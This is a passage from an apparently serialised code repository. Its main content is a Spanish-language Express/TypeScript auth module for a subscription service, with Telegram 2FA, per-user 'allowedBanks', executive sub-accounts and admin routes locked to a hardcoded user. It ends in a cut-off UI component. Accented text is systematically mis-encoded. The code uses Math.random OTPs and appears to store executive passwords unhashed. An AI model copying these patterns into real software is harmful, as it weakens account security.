maxExecutives: 8,\n            isActive: true,\n          });\n          console.log(`[Auth] Perfil de oficina creado para usuario ${username} (ID: ${user.id})`);\n        } catch (error: any) {\n          console.error(`[Auth] Error creando perfil de oficina para ${username}:`, error);\n          // No falla el registro si falla la creaci贸n del perfil\n        }\n      }\n      \n      // Si se us贸 un c贸digo de descuento, actualizar el usedBy con el ID real del usuario\n      if (discountCode && claimedDiscount) {\n        await storage.markDiscountCodeAsUsed(claimedDiscount.id, user.id);\n        console.log(`[Auth] C贸digo de descuento ${discountCode} actualizado con usuario real ${username} (ID: ${user.id})`);\n      }\n      \n      console.log(`[Auth] Usuario ${username} registrado exitosamente. Requiere aprobaci贸n del administrador.`);\n      \n      // Si el usuario proporcion贸 un Chat ID, enviar instrucciones de pago autom谩ticamente\n      if (telegramChatId) {\n        try {\n          const { sendPaymentInstructions } = await import('./telegramBot');\n          await sendPaymentInstructions(user, 'registration');\n          console.log(`[Auth] Instrucciones de pago enviadas a ${username} v铆a Telegram`);\n        } catch (error: any) {\n          console.error(`[Auth] Error enviando instrucciones de pago a ${username}:`, error);\n          // No fallar el registro si falla el env铆o del mensaje\n        }\n      }\n      \n      // NO iniciar sesi贸n autom谩ticamente - el usuario debe esperar aprobaci贸n\n      return res.status(201).json({ \n        ...user, \n        password: undefined,\n        message: discountApplied > 0 \n          ? `Registro exitoso. Descuento de $${discountApplied} MXN aplicado. Precio final: $${customPrice} MXN. Recibir谩s las instrucciones de pago en Telegram.`\n          : \"Registro exitoso. Recibir谩s las instrucciones de pago en Telegram.\"\n      });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Ruta para login\n  app.post(\"/api/login\", (req, res, next) => {\n    // Regenerar ID de sesi贸n antes de iniciar sesi贸n\n    req.session.regenerate((regenerateErr) => {\n      if (regenerateErr) {\n        console.error(\"[Auth] Error regenerando sesi贸n antes del login:\", regenerateErr);\n        // Continuar a pesar del error\n      }\n      \n      passport.authenticate(\"local\", async (err: Error, user: Express.User | false | null, info: any) => {\n        if (err) {\n          console.error(\"[Auth] Error en autenticaci贸n:\", err);\n          return next(err);\n        }\n        \n        if (!user) {\n          console.log(\"[Auth] Intento de login fallido:\", info?.message || \"credenciales inv谩lidas\");\n          return res.status(401).json({ message: info?.message || \"Credenciales inv谩lidas\" });\n        }\n        \n        console.log(`[Auth] Usuario autenticado: ${user.username}, role: ${user.role}`);\n        \n        // Se ha eliminado la verificaci贸n del l铆mite de dispositivos\n        \n        // En lugar de hacer login inmediatamente, requerimos 2FA\n        console.log(`[Auth] Credenciales v谩lidas para ${user.username}, iniciando proceso 2FA`);\n        \n        // Si el usuario no tiene Chat ID configurado, no puede usar 2FA\n        if (!user.telegramChatId) {\n          return res.status(400).json({ \n            message: \"Debes configurar tu Chat ID de Telegram para usar 2FA. Contacta al administrador.\",\n            requiresTelegramSetup: true \n          });\n        }\n        \n        // Importar funci贸n de Telegram para enviar c贸digo\n        const { sendVerificationCode } = await import('./telegramBot');\n        \n        try {\n          const result = await sendVerificationCode(user.id, user.username);\n          if (!result.success) {\n            return res.status(500).json({ \n              message: `Error enviando c贸digo 2FA: ${result.error}`,\n              requiresRetry: true \n            });\n          }\n          \n          console.log(`[Auth] C贸digo 2FA enviado exitosamente a ${user.username}`);\n          \n          // Guardar datos temporales de usuario para completar login despu茅s de 2FA\n          (req.session as any).pendingUser = {\n            id: user.id,\n            username: user.username,\n            timestamp: Date.now()\n          };\n          \n          return res.json({ \n            requiresTwoFactor: true,\n            message: \"C贸digo de verificaci贸n enviado a tu Telegram. Ingr茅salo para continuar.\",\n            username: user.username\n          });\n          \n        } catch (error) {\n          console.error(`[Auth] Error en proceso 2FA para ${user.username}:`, error);\n          return res.status(500).json({ \n            message: \"Error interno durante el proceso de autenticaci贸n\",\n            requiresRetry: true \n          });\n        }\n      })(req, res, next);\n    });\n  });\n\n  // Ruta para logout - Reduce el contador de dispositivos al cerrar sesi贸n\n  app.post(\"/api/logout\", async (req, res, next) => {\n    // Solo procesar si hay sesi贸n activa\n    if (!req.isAuthenticated()) {\n      return res.json({ success: true, message: \"No hab铆a sesi贸n activa\" });\n    }\n    \n    // Capturar datos del usuario antes de cerrar sesi贸n\n    const user = req.user;\n    const username = user.username;\n    const isAdmin = user.role === UserRole.ADMIN;\n    \n    console.log(`[Auth] Solicitud de cierre de sesi贸n para: ${username}`);\n    \n    // Limpiar del control de sesiones activas\n    const sessionId = req.sessionID;\n    cleanupUserSessions(user.id, sessionId);\n    console.log(`[SessionControl] Usuario ${username}: Sesi贸n ${sessionId} removida del control. Sesiones restantes: ${activeSessions.get(user.id)?.length || 0}`);\n    \n    // Cerrar sesi贸n\n    req.logout((err) => {\n      if (err) {\n        console.error(`[Auth] Error al cerrar sesi贸n para ${username}:`, err);\n        return next(err);\n      }\n      \n      // Regenerar ID de sesi贸n para mayor seguridad\n      req.session.regenerate((regenerateErr) => {\n        if (regenerateErr) {\n          console.error(`[Auth] Error al regenerar sesi贸n para ${username}:`, regenerateErr);\n          // Continuar aunque falle la regeneraci贸n\n        }\n        \n        console.log(`[Auth] Sesi贸n cerrada correctamente para: ${username}`);\n        res.json({ success: true });\n      });\n    });\n  });\n\n  // Ruta para verificar c贸digo 2FA y completar login\n  app.post(\"/api/verify-2fa\", async (req, res, next) => {\n    const { code } = req.body;\n    \n    if (!(req.session as any).pendingUser) {\n      return res.status(400).json({ message: \"No hay sesi贸n de verificaci贸n pendiente\" });\n    }\n    \n    const { id, username, timestamp } = (req.session as any).pendingUser;\n    \n    // Verificar que la sesi贸n no haya expirado (15 minutos)\n    if (Date.now() - timestamp > 15 * 60 * 1000) {\n      delete (req.session as any).pendingUser;\n      return res.status(400).json({ message: \"La sesi贸n de verificaci贸n ha expirado. Inicia sesi贸n nuevamente.\" });\n    }\n    \n    // Importar funci贸n de verificaci贸n\n    const { verifyCode } = await import('./telegramBot');\n    \n    try {\n      const verification = await verifyCode(id, code);\n      if (!verification.success) {\n        return res.status(400).json({ message: verification.error });\n      }\n      \n      // Obtener datos del usuario nuevamente\n      const user = await storage.getUserById(id);\n      if (!user) {\n        delete (req.session as any).pendingUser;\n        return res.status(400).json({ message: \"Usuario no encontrado\" });\n      }\n      \n      // Completar el login\n      req.login(user as Express.User, async (loginErr) => {\n        if (loginErr) {\n          console.error(`[Auth] Error en login 2FA para ${username}:`, loginErr);\n          return next(loginErr);\n        }\n        \n        // Control de sesiones concurrentes\n        const sessionId = req.sessionID;\n        const userAgent = req.get('User-Agent');\n        \n        // Cerrar sesiones m谩s antiguas si excede el l铆mite\n        const closedSessions = closeOldestSessions(user.id);\n        if (closedSessions > 0) {\n          console.log(`[SessionControl] Usuario ${username}: Cerradas ${closedSessions} sesi贸n(es) antigua(s) para permitir nueva sesi贸n`);\n        }\n        \n        // Agregar la nueva sesi贸n\n        addActiveSession(user.id, sessionId, userAgent);\n        console.log(`[SessionControl] Usuario ${username}: Nueva sesi贸n activa ${sessionId}. Total de sesiones: ${activeSessions.get(user.id)?.length || 0}`);\n        \n        // Limpiar datos temporales\n        delete (req.session as any).pendingUser;\n        \n        // Actualizar fecha de 煤ltimo login\n        try {\n          await storage.updateUserLastLogin(user.id);\n          console.log(`[Auth] Login 2FA completado con 茅xito para: ${username}`);\n        } catch (error) {\n          console.error(`[Auth] Error actualizando datos de usuario ${username}:`, error);\n        }\n        \n        return res.json({ \n          id: user.id,\n          username: user.username,\n          role: user.role,\n          isActive: user.isActive\n        });\n      });\n      \n    } catch (error) {\n      console.error(`[Auth] Error verificando c贸digo 2FA para ${username}:`, error);\n      return res.status(500).json({ message: \"Error interno durante la verificaci贸n\" });\n    }\n  });\n\n  // Ruta para obtener informaci贸n del usuario actual\n  app.get(\"/api/user\", (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    const user = req.user as any;\n    \n    res.json({ \n      ...user, \n      password: undefined\n    });\n  });\n\n  // Ruta para actualizar el perfil del usuario (Chat ID de Telegram)\n  app.put(\"/api/user/profile\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user as Express.User;\n    const { telegramChatId } = req.body;\n    \n    try {\n      const updatedUser = await storage.updateUser(user.id, { telegramChatId });\n      res.json({ ...updatedUser, password: undefined });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Ruta para obtener todos los usuarios (solo para administradores)\n  app.get(\"/api/users\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user as Express.User;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      const users = await storage.getAllAdminUsers();\n      res.json(users.map((u) => ({ ...u, password: undefined })));\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Ruta para obtener informaci贸n de sesiones activas (solo administradores)\n  app.get(\"/api/sessions/active\", (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user as Express.User;\n    if (user.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    const sessionInfo = Array.from(activeSessions.entries()).map(([userId, sessions]) => ({\n      userId,\n      sessionCount: sessions.length,\n      sessions: sessions.map(session => ({\n        sessionId: session.sessionId,\n        timestamp: session.timestamp,\n        userAgent: session.userAgent,\n        createdAt: new Date(session.timestamp).toISOString()\n      }))\n    }));\n    \n    res.json({\n      totalUsers: sessionInfo.length,\n      maxSessionsPerUser: MAX_SESSIONS_PER_USER,\n      activeSessions: sessionInfo\n    });\n  });\n\n  // Ruta para obtener usuarios regulares (solo visible para el usuario \"balonx\")\n  app.get(\"/api/users/regular\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user as Express.User;\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (user.username !== \"balonx\") {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      // Obtener todos los usuarios (excluyendo administradores)\n      const allUsers = await storage.getAllUsers();\n      const regularUsers = allUsers.filter(u => u.role === UserRole.USER);\n      res.json(regularUsers.map((u) => ({\n        id: u.id,\n        username: u.username,\n        role: u.role,\n        accountType: u.accountType, // Tipo de cuenta: 'individual' o 'office'\n        isActive: u.isActive, // Corregido: usar isActive en lugar de active\n        expiresAt: u.expiresAt, // Agregado: fecha de expiraci贸n\n        deviceCount: u.deviceCount, // Agregado: conteo de dispositivos\n        maxDevices: u.maxDevices, // Agregado: m谩ximo de dispositivos\n        allowedBanks: u.allowedBanks, // Agregado: bancos permitidos\n        telegramChatId: u.telegramChatId, // Agregado: Chat ID de Telegram\n        createdAt: u.createdAt, // Agregado: fecha de creaci贸n\n        lastLogin: u.lastLogin,\n        customPrice: u.customPrice // Precio personalizado para el usuario\n      })));\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Ruta para cambiar el estado de un usuario administrador (activar/desactivar)\n  app.put(\"/api/users/:username/toggle-status\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const currentUser = req.user as Express.User;\n    if (currentUser.role !== UserRole.ADMIN) {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      const { username } = req.params;\n      const success = await storage.toggleAdminUserStatus(username);\n      \n      if (!success) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n      \n      res.json({ success: true });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Ruta para cambiar el estado de un usuario regular (activar/desactivar)\n  // Solo accesible para el usuario \"balonx\"\n  app.post(\"/api/users/regular/:username/toggle-status\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const currentUser = req.user as Express.User;\n    if (currentUser.username !== \"balonx\") {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      const { username } = req.params;\n      const success = await storage.toggleUserStatus(username);\n      \n      if (!success) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n      \n      res.json({ success: true });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Ruta para activar un usuario por 1 d铆a\n  app.post(\"/api/users/regular/:username/activate-one-day\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const currentUser = req.user as Express.User;\n    if (currentUser.username !== \"balonx\") {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      const { username } = req.params;\n      const { allowedBanks } = req.body; // Obtener bancos permitidos del cuerpo de la solicitud\n      \n      console.log(`[Auth] Activando usuario ${username} por 1 d铆a, bancos permitidos: ${allowedBanks || 'valor no proporcionado (se conservar谩 el actual)'}`);\n      \n      // Pasar el par谩metro allowedBanks al m茅todo de storage si se proporciona\n      const user = await storage.activateUserForOneDay(username, allowedBanks);\n      \n      if (!user) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n      \n      const expiresAt = user.expiresAt;\n      res.json({ \n        success: true, \n        username: user.username,\n        isActive: user.isActive,\n        expiresAt,\n        allowedBanks: user.allowedBanks, // Devolver el valor actualizado\n        message: \"Usuario activado por 1 d铆a\"\n      });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Ruta para activar un usuario por 7 d铆as\n  app.post(\"/api/users/regular/:username/activate-seven-days\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const currentUser = req.user as Express.User;\n    if (currentUser.username !== \"balonx\") {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n    \n    try {\n      const { username } = req.params;\n      const { allowedBanks } = req.body; // Obtener bancos permitidos del cuerpo de la solicitud\n      \n      console.log(`[Auth] Activando usuario ${username} por 7 d铆as, bancos permitidos: ${allowedBanks || 'valor no proporcionado (se conservar谩 el actual)'}`);\n      \n      // Pasar el par谩metro allowedBanks al m茅todo de storage si se proporciona\n      const user = await storage.activateUserForSevenDays(username, allowedBanks);\n      \n      if (!user) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n      \n      const expiresAt = user.expiresAt;\n      res.json({ \n        success: true, \n        username: user.username,\n        isActive: user.isActive,\n        expiresAt,\n        allowedBanks: user.allowedBanks, // Devolver el valor actualizado\n        message: \"Usuario activado por 7 d铆as\"\n      });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Ruta para obtener informaci贸n de expiraci贸n del usuario actual\n  app.get(\"/api/user/subscription\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    try {\n      const user = req.user;\n      \n      if (user.role === UserRole.ADMIN) {\n        return res.json({\n          isActive: true,\n          isPaid: true,\n          isAdmin: true,\n          expiresAt: null,\n          daysRemaining: null,\n          hoursRemaining: null,\n          message: \"Los administradores no tienen fecha de expiraci贸n\"\n        });\n      }\n      \n      const now = new Date();\n      let daysRemaining = null;\n      let hoursRemaining = null;\n      let message = \"\";\n      \n      if (user.expiresAt) {\n        const expiresAt = new Date(user.expiresAt);\n        const timeRemainingMs = expiresAt.getTime() - now.getTime();\n        \n        if (timeRemainingMs <= 0) {\n          // Ya expir贸\n          message = \"Tu suscripci贸n ha expirado. Contacta al administrador en Telegram: @BalonxSistema para renovar.\";\n          // Desactivar autom谩ticamente\n          await storage.updateUser(user.id, { isActive: false });\n        } else {\n          // Calcular d铆as y horas restantes\n          daysRemaining = Math.floor(timeRemainingMs / (1000 * 60 * 60 * 24));\n          hoursRemaining = Math.floor((timeRemainingMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));\n          \n          if (daysRemaining === 0 && hoursRemaining < 24) {\n            message = `Tu suscripci贸n vence en ${hoursRemaining} horas. Contacta al administrador en Telegram: @BalonxSistema para renovar.`;\n          } else {\n            message = `Tu suscripci贸n vence en ${daysRemaining} d铆as y ${hoursRemaining} horas.`;\n          }\n        }\n      } else if (!user.isActive) {\n        message = \"Tu cuenta est谩 inactiva. Contacta al administrador en Telegram: @BalonxSistema para activarla.\";\n      } else {\n        message = \"Tu cuenta est谩 activa sin fecha de expiraci贸n establecida.\";\n      }\n      \n      res.json({\n        isActive: user.isActive,\n        isPaid: user.isActive && (!user.expiresAt || new Date(user.expiresAt) > now),\n        isAdmin: false,\n        expiresAt: user.expiresAt,\n        daysRemaining,\n        hoursRemaining,\n        message\n      });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Rutas para login de ejecutivos\n  app.post(\"/api/executive/login\", async (req, res) => {\n    try {\n      const { username, password } = req.body;\n      \n      if (!username || !password) {\n        return res.status(400).json({ message: \"Usuario y contrase帽a son requeridos\" });\n      }\n      \n      // Validar ejecutivo\n      const executive = await storage.validateExecutive(username, password);\n      if (!executive) {\n        return res.status(401).json({ message: \"Credenciales inv谩lidas\" });\n      }\n      \n      // Verificar que el ejecutivo est茅 activo\n      if (!executive.isActive) {\n        return res.status(403).json({ message: \"Cuenta de ejecutivo inactiva\" });\n      }\n      \n      // Obtener usuario oficina (due帽o)\n      const officeUser = await storage.getUserById(executive.userId);\n      if (!officeUser || !officeUser.telegramChatId) {\n        return res.status(400).json({ \n          message: \"La oficina no tiene Telegram configurado. Contacta al administrador.\" \n        });\n      }\n      \n      // Generar c贸digo OTP de 6 d铆gitos\n      const otpCode = Math.floor(100000 + Math.random() * 900000).toString();\n      \n      // Guardar OTP en base de datos\n      await storage.updateExecutiveOtp(executive.id, otpCode);\n      \n      // Enviar OTP al Telegram de la oficina\n      try {\n        const { sendExecutiveOtp } = await import('./telegramBot');\n        await sendExecutiveOtp(officeUser.telegramChatId, executive.username, executive.displayName || executive.username, otpCode);\n        \n        console.log(`[Auth] OTP enviado a oficina ${officeUser.username} para ejecutivo ${executive.username}`);\n        \n        // Guardar datos del ejecutivo en sesi贸n para verificaci贸n OTP\n        (req.session as any).pendingExecutive = {\n          id: executive.id,\n          username: executive.username,\n          userId: executive.userId\n        };\n        \n        return res.json({ \n          requiresOtp: true,\n          message: \"C贸digo OTP enviado al Telegram de la oficina\" \n        });\n      } catch (error: any) {\n        console.error(`[Auth] Error enviando OTP:`, error);\n        return res.status(500).json({ \n          message: \"Error enviando c贸digo OTP. Intenta nuevamente.\" \n        });\n      }\n    } catch (error: any) {\n      console.error(\"[Auth] Error en login de ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  app.post(\"/api/executive/verify-otp\", async (req, res) => {\n    try {\n      const { otpCode } = req.body;\n      const pendingExecutive = (req.session as any).pendingExecutive;\n      \n      if (!pendingExecutive) {\n        return res.status(400).json({ message: \"No hay login pendiente\" });\n      }\n      \n      if (!otpCode) {\n        return res.status(400).json({ message: \"C贸digo OTP requerido\" });\n      }\n      \n      // Obtener ejecutivo con OTP\n      const executive = await storage.getExecutiveById(pendingExecutive.id);\n      if (!executive) {\n        return res.status(404).json({ message: \"Ejecutivo no encontrado\" });\n      }\n      \n      // Verificar c贸digo OTP\n      if (executive.lastOtpCode !== otpCode) {\n        return res.status(401).json({ message: \"C贸digo OTP inv谩lido\" });\n      }\n      \n      // Verificar que el OTP no haya expirado (5 minutos)\n      if (executive.lastOtpTime) {\n        const otpAge = Date.now() - new Date(executive.lastOtpTime).getTime();\n        if (otpAge > 5 * 60 * 1000) {\n          return res.status(401).json({ message: \"C贸digo OTP expirado\" });\n        }\n      }\n      \n      // OTP v谩lido - crear sesi贸n como ejecutivo\n      const officeUser = await storage.getUserById(executive.userId);\n      if (!officeUser) {\n        return res.status(404).json({ message: \"Oficina no encontrada\" });\n      }\n      \n      // Verificar que la oficina est茅 activa\n      if (!officeUser.isActive) {\n        return res.status(403).json({ message: \"La cuenta de la oficina est谩 inactiva\" });\n      }\n      \n      // Limpiar sesi贸n pendiente\n      delete (req.session as any).pendingExecutive;\n      \n      // Actualizar 煤ltimo login\n      await storage.updateExecutive(executive.id, { lastLogin: new Date() });\n      \n      // Crear un usuario virtual para el ejecutivo con permisos heredados del due帽o\n      const executiveUser = {\n        id: executive.id, // ID del ejecutivo (no del due帽o)\n        username: executive.username, // Username del ejecutivo\n        displayName: executive.displayName,\n        role: officeUser.role, // Heredar rol del due帽o\n        isActive: executive.isActive,\n        allowedBanks: officeUser.allowedBanks, // Heredar bancos del due帽o\n        accountType: officeUser.accountType,\n        isExecutive: true, // Marcar como ejecutivo\n        officeUserId: officeUser.id, // Referencia al due帽o\n        officeUsername: officeUser.username\n      };\n      \n      // Establecer sesi贸n con el usuario ejecutivo virtual\n      req.login(executiveUser as any, (err) => {\n        if (err) {\n          console.error(\"[Auth] Error estableciendo sesi贸n de ejecutivo:\", err);\n          return res.status(500).json({ message: \"Error estableciendo sesi贸n\" });\n        }\n        \n        // Control de sesiones para ejecutivos (solo 1 sesi贸n activa)\n        const sessionId = (req.session as any).id;\n        const userAgent = req.get('User-Agent');\n        \n        // Los ejecutivos solo pueden tener 1 sesi贸n activa (usar su propio ID)\n        const userSessions = activeSessions.get(executive.id) || [];\n        \n        // Cerrar sesiones previas del ejecutivo\n        if (userSessions.length > 0) {\n          for (const oldSession of userSessions) {\n            cleanupUserSessions(executive.id, oldSession.sessionId);\n          }\n          console.log(`[SessionControl] Ejecutivo ${executive.username}: Cerradas ${userSessions.length} sesi贸n(es) antigua(s)`);\n        }\n        \n        // Agregar nueva sesi贸n usando el ID del ejecutivo\n        addActiveSession(executive.id, sessionId, userAgent);\n        console.log(`[SessionControl] Ejecutivo ${executive.username}: Nueva sesi贸n activa ${sessionId}`);\n        \n        console.log(`[Auth] Ejecutivo ${executive.username} autenticado exitosamente con su propio perfil`);\n        \n        // Devolver datos del ejecutivo\n        return res.json({ \n          success: true,\n          user: {\n            id: executive.id,\n            username: executive.username,\n            displayName: executive.displayName,\n            role: officeUser.role,\n            isActive: executive.isActive,\n            isExecutive: true,\n            officeUsername: officeUser.username\n          },\n          message: \"Login exitoso\" \n        });\n      });\n    } catch (error: any) {\n      console.error(\"[Auth] Error verificando OTP de ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Rutas CRUD para gestionar ejecutivos\n  \n  // Obtener ejecutivos del usuario oficina actual\n  app.get(\"/api/executives\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user;\n    \n    // Solo usuarios de tipo oficina pueden gestionar ejecutivos\n    if (user.accountType !== 'office') {\n      return res.status(403).json({ message: \"Solo cuentas de oficina pueden gestionar ejecutivos\" });\n    }\n    \n    try {\n      const executives = await storage.getExecutivesByOfficeId(user.id);\n      res.json(executives);\n    } catch (error: any) {\n      console.error(\"[Executives] Error obteniendo ejecutivos:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Crear nuevo ejecutivo\n  app.post(\"/api/executives\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user;\n    \n    if (user.accountType !== 'office') {\n      return res.status(403).json({ message: \"Solo cuentas de oficina pueden crear ejecutivos\" });\n    }\n    \n    try {\n      const { username, password, displayName } = req.body;\n      \n      if (!username || !password) {\n        return res.status(400).json({ message: \"Usuario y contrase帽a son requeridos\" });\n      }\n      \n      // Verificar l铆mite de ejecutivos\n      const officeProfile = await storage.getOfficeProfileByUserId(user.id);\n      if (!officeProfile) {\n        return res.status(404).json({ message: \"Perfil de oficina no encontrado\" });\n      }\n      \n      if (officeProfile.currentExecutives >= officeProfile.maxExecutives) {\n        return res.status(400).json({ \n          message: `L铆mite de ejecutivos alcanzado (${officeProfile.maxExecutives})` \n        });\n      }\n      \n      // Crear ejecutivo\n      const executive = await storage.createExecutive({\n        userId: user.id,\n        username,\n        password,\n        displayName: displayName || username\n      });\n      \n      // Actualizar contador de ejecutivos\n      await storage.updateUser(user.id, {\n        currentExecutives: officeProfile.currentExecutives + 1\n      });\n      \n      await storage.updateOfficeProfile(officeProfile.id, {\n        currentExecutives: officeProfile.currentExecutives + 1\n      });\n      \n      res.json({ success: true, executive });\n    } catch (error: any) {\n      console.error(\"[Executives] Error creando ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Actualizar ejecutivo\n  app.put(\"/api/executives/:id\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user;\n    \n    if (user.accountType !== 'office') {\n      return res.status(403).json({ message: \"Solo cuentas de oficina pueden actualizar ejecutivos\" });\n    }\n    \n    try {\n      const { id } = req.params;\n      const { displayName, password } = req.body;\n      \n      // Verificar que el ejecutivo pertenece a esta oficina\n      const executive = await storage.getExecutiveById(Number(id));\n      if (!executive || executive.userId !== user.id) {\n        return res.status(404).json({ message: \"Ejecutivo no encontrado\" });\n      }\n      \n      const updateData: any = {};\n      if (displayName !== undefined) updateData.displayName = displayName;\n      if (password) updateData.password = password;\n      \n      await storage.updateExecutive(Number(id), updateData);\n      \n      res.json({ success: true });\n    } catch (error: any) {\n      console.error(\"[Executives] Error actualizando ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Activar/desactivar ejecutivo\n  app.put(\"/api/executives/:id/toggle-status\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user;\n    \n    if (user.accountType !== 'office') {\n      return res.status(403).json({ message: \"Solo cuentas de oficina pueden gestionar ejecutivos\" });\n    }\n    \n    try {\n      const { id } = req.params;\n      \n      // Verificar que el ejecutivo pertenece a esta oficina\n      const executive = await storage.getExecutiveById(Number(id));\n      if (!executive || executive.userId !== user.id) {\n        return res.status(404).json({ message: \"Ejecutivo no encontrado\" });\n      }\n      \n      await storage.updateExecutive(Number(id), { \n        isActive: !executive.isActive \n      });\n      \n      res.json({ success: true, isActive: !executive.isActive });\n    } catch (error: any) {\n      console.error(\"[Executives] Error cambiando estado de ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n  \n  // Eliminar ejecutivo\n  app.delete(\"/api/executives/:id\", async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n    \n    const user = req.user;\n    \n    if (user.accountType !== 'office') {\n      return res.status(403).json({ message: \"Solo cuentas de oficina pueden eliminar ejecutivos\" });\n    }\n    \n    try {\n      const { id } = req.params;\n      \n      // Verificar que el ejecutivo pertenece a esta oficina\n      const executive = await storage.getExecutiveById(Number(id));\n      if (!executive || executive.userId !== user.id) {\n        return res.status(404).json({ message: \"Ejecutivo no encontrado\" });\n      }\n      \n      await storage.deleteExecutive(Number(id));\n      \n      // Actualizar contador de ejecutivos\n      const officeProfile = await storage.getOfficeProfileByUserId(user.id);\n      if (officeProfile) {\n        await storage.updateUser(user.id, {\n          currentExecutives: Math.max(0, officeProfile.currentExecutives - 1)\n        });\n        \n        await storage.updateOfficeProfile(officeProfile.id, {\n          currentExecutives: Math.max(0, officeProfile.currentExecutives - 1)\n        });\n      }\n      \n      res.json({ success: true });\n    } catch (error: any) {\n      console.error(\"[Executives] Error eliminando ejecutivo:\", error);\n      res.status(500).json({ message: error.message });\n    }\n  });\n}","size_bytes":47745},"client/src/components/ui/command.tsx":{"content":"import * as React from \"react\"\nimport { type DialogProps } from \"@radix-ui/react-dialog\"\nimport { Command as CommandPrimitive } from \"cmdk\"\nimport { Search } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\nimport { Dialog, DialogContent } from \"@/components/ui/dialog\"\n\nconst Command = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive>\n>(({ className, ...props }, ref) => (\n  <CommandPrimitive\n    ref={ref}\n    className={cn(\n      \"flex h-full w-full flex-col overflow-hidden rounded-md bg-popover text-popover-foreground\",\n      className\n    )}\n    {...props}\n  />\n))\nCommand.displayName = CommandPrimitive.displayName\n\ninterface CommandDialogProps extends DialogProps {}\n\nconst CommandDialog = ({ children, ...props }: CommandDialogProps) => {\n  return (\n    <Dialog {...props}>\n      <DialogContent className=\"overflow-hidden p-0 shadow-lg\">\n        <Command className=\"[&_[cmdk-group-heading]]:px-2 [&_[cmdk-group-heading]]:font-medium [&_[cmdk-group-heading]]:text-muted-foreground [&_[cmdk-group]:not([hidden])_~[cmdk-group]]:pt-0 [&_[cmdk-group]]:px-2 [&_[cmdk-input-wrapper]_svg]:h-5 [&_[cmdk-input-wrapper]_svg]:w-5 [&_[cmdk-input]]:h-12 [&_[cmdk-item]]:px-2 [&_[cmdk-item]]:py-3 [&_[cmdk-item]_svg]:h-5 [&_[cmdk-item]_svg]:w-5\">\n          {children}\n        </Command>\n      </DialogContent>\n    </Dialog>\n  )\n}\n\nconst CommandInput = React.forwardRef<\n  React.ElementRef<typeof CommandPrimitive.Input>,\n  React.ComponentPropsWithoutRef<typeof CommandPrimitive.Input>\n>(({ className, ...props }, ref) => (\n  <div className=\"flex items-center border-b px-3\" cmdk-input-wrapper=\"\">\n    <Search className=\"mr-2 h-4 w-4 shrink-0 opacity-50\" />\n    <CommandPrimitive.Input\n      ref={ref}\n      className={cn(\n        